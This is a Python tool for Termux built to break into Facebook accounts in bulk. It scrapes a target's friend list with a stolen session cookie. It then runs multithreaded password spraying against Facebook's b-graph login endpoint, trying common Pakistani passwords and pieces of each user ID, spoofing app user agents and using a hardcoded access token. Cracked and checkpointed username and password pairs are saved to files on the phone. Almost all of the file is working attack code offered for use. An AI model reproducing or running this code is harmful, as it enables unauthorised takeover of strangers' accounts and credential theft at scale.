import os, sys, time, random, string, requests, re, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- Storage Check & Permission ---
try:
    if not os.path.exists('/sdcard'):
        os.system('termux-setup-storage')
except:pass

loop = 0
oks = []
cps = []

# --- Real Samsung/Pakistan UserAgents (Fresh 2025) ---
def get_ua():
    android_version = random.choice(['12', '13', '14', '15'])
    samsung_models = ['SM-S928B', 'SM-G998B', 'SM-A546B', 'SM-M536B', 'SM-A156B']
    model = random.choice(samsung_models)
    fbv = f"{random.randint(440, 500)}.0.0.{random.randint(10, 99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

def banner():
    os.system('clear')
    print(f"""\033[1;31m
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    [+] STATUS   : \033[1;37mREAL CODING V12  \033[1;32m[+] TYPE     : \033[1;37mAUTO-SAVE
\033[1;32m    [+] STORAGE  : \033[1;37m/sdcard/OK.txt   \033[1;32m[+] DUMPER   : \033[1;37mWORKING
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ━━━━━━━━━━━━━━━━━━━━━ REAL WORKING DUMPER ━━━━━━━━━━━━━━━━━━━━━
def dump_system():
    banner()
    cookie = input(" \033[1;32m[+] Paste Cookie : \033[1;37m")
    target = input(" \033[1;32m[+] Target UID   : \033[1;37m")
    
    save_path = '/sdcard/dump.txt'
    try:
        headers = {
            'host': 'mbasic.facebook.com',
            'cookie': cookie,
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
        }
        # Scrape friendlist
        url = f'https://mbasic.facebook.com/{target}?v=friends'
        res = requests.get(url, headers=headers).text
        
        if 'checkpoint' in res or 'Log In' in res:
            print(" \033[1;31m[!] Cookie Expired or Invalid!")
            time.sleep(2); main_menu()
            
        # Real IDs Extracting logic
        ids = re.findall('/friends/hovercard/\?uid=(.*?)&', res)
        
        if ids:
            with open(save_path, 'w') as f:
                for uid in ids:
                    f.write(f"{uid}|Facebook User\n")
            print(f"\n \033[1;32m[+] Successfully Dumped {len(ids)} IDs")
            print(f" \033[1;32m[+] File Saved in: {save_path}")
        else:
            print(" \033[1;31m[!] Private Friendlist. No IDs found.")
            
    except Exception as e:
        print(f" \033[1;31m[!] Error: {str(e)}")
    
    input("\n [Press Enter To Back]"); main_menu()

# ━━━━━━━━━━━━━━━━━━━━━ CLONING & SAVING ENGINE ━━━━━━━━━━━━━━━━━━━━━
def crack_logic(uid):
    global loop, oks, cps
    sys.stdout.write(f'\r \033[1;37m[EXECUTOR] {loop} | \033[1;32mOK:{len(oks)} | \033[1;33mCP:{len(cps)} '); sys.stdout.flush()
    
    pws = [uid, uid[3:], uid[6:], '786786', 'pakistan', 'khan123', 'ali123', '572732']
    
    for pw in pws:
        if len(pw) < 6: continue
        ua = get_ua()
        session = requests.Session()
        
        try:
            # High-Speed B-Graph Login
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "email": uid, "password": pw, "sdk_style": "android", "locale": "en_US"
            }
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n\033[1;32m [OK] {uid} | {pw}')
                oks.append(uid)
                # REAL SAVING TO STORAGE
                with open('/sdcard/OK.txt', 'a') as ok_file:
                    ok_file.write(f"{uid}|{pw}\n")
                break
            elif "checkpoint" in str(res):
                print(f'\r\n\033[1;33m [CP] {uid} | {pw}')
                cps.append(uid)
                with open('/sdcard/CP.txt', 'a') as cp_file:
                    cp_file.write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def file_start():
    banner()
    path = input(" \033[1;32m[+] File Path (e.g /sdcard/dump.txt) : \033[1;37m")
    try:
        ids = open(path, 'r').read().splitlines()
        banner()
        print(f" \033[1;32m[+] TOTAL IDs : {len(ids)}")
        print(f" \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        with tred(max_workers=50) as engine:
            for uid in ids:
                engine.submit(crack_logic, uid)
    except: print(" [!] File Error!"); time.sleep(2); main_menu()

def main_menu():
    banner()
    print(f" \033[1;32m[1] Create File (Real Dump)")
    print(f" \033[1;32m[2] Start Cloning (File)")
    print(f" \033[1;31m[0] Exit")
    print(f"\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(' \033[1;32m[?] Choice : \033[1;37m')
    if opt == '1': dump_system()
    elif opt == '2': file_start()
    else: exit()

if __name__ == "__main__":
    main_menu()
